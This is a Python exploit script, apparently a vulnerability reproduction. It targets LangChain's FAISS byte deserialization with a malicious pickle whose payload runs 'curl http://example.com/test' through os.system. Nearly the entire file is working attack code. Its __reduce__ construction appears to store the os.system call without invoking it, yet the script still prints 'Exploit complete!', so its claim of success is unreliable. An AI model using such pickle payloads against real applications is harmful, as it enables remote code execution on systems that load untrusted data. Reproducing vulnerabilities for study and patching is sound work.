#!/usr/bin/env python3
import pickle
import os
import base64
import sys

# Add the local langchain directory to the Python path to leverage vulnerable files 
sys.path.insert(0, os.path.abspath("../../../codebase/libs/community"))

from langchain_community.embeddings.huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS

def add_padding(base64_string):
        missing_padding = len(base64_string) % 4
        if missing_padding:
            base64_string += '=' * (4 - missing_padding)
        return base64_string

class Test(object):

    def __init__(self):
        self.a = 1

    def __reduce__(self):
        # adjusted malicious payload to match expected structure from FAISS.py
        fake_index = (os.system, ('curl http://example.com/test',)) 
        fake_docstore = {}
        fake_mapping = {}
        return (tuple, ([fake_index, fake_docstore, fake_mapping],))

if __name__ == '__main__':
    tmp = Test()
    data = pickle.dumps(tmp)
    encoded_data = base64.b64encode(data).decode() 
    print(encoded_data)

    embeddings = HuggingFaceEmbeddings(model_name="all-MiniLM-L6-v2")

    # Adding padding to ensure proper decoding
    padded_data = add_padding(encoded_data)

    db = FAISS.deserialize_from_bytes(
        embeddings=embeddings, serialized=base64.b64decode(padded_data), allow_dangerous_deserialization=True
    )
    print("Exploit complete!")